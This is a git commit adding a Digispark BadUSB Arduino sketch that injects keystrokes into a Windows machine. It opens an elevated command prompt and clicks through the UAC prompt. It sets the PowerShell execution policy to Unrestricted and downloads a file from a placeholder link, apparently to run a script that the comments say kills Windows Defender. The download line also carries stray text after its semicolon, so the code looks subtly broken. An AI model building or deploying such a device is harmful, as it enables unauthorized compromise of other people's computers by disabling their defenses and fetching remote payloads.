1ab45d54329425f379c2cdf0d664d4aebf9a6881
paulgrey <92078095+paulgrey666@users.noreply.github.com>
2023-05-18 22:20:44 -0400

    Create badusb.ino

---
+++ badusb.ino
@@ -0,0 +1,43 @@
+#include <DigiKeyboard.h>
+/*Nothing to specify*/
+
+void setup()
+{//turn LED off while code is running, this means the device is safe to unplug as soon as the LED turns back on
+  pinMode(1, OUTPUT); //LED on Model A
+
+  //Kill Windows Defender
+  DigiKeyboard.update();
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(3000);
+  
+    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);//Open RUN
+    DigiKeyboard.delay(1000);
+    DigiKeyboard.print("cmd");
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.delay(1000);
+    DigiKeyboard.println("powershell Start-Process cmd -Verb runAs");
+    DigiKeyboard.delay(1000);
+  
+  DigiKeyboard.update();
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.write('\t');
+  DigiKeyboard.delay(100);
+  DigiKeyboard.write('\t');
+  DigiKeyboard.delay(100);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(3000);
+  
+    DigiKeyboard.println("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
+    DigiKeyboard.delay(3000);
+    DigiKeyboard.println("powershell (New-Object System.Net.WebClient).DownloadFile('https://YOURLINK','COMPLETEFILENAME')"); .\disable.ps1
+    DigiKeyboard.delay(150000);
+
+
+}  
+void loop() {
+  
+  pinMode(1, OUTPUT); //LED on Model A ON
+
+  pinMode(0, OUTPUT); //LED on Model A OFF
+
+}
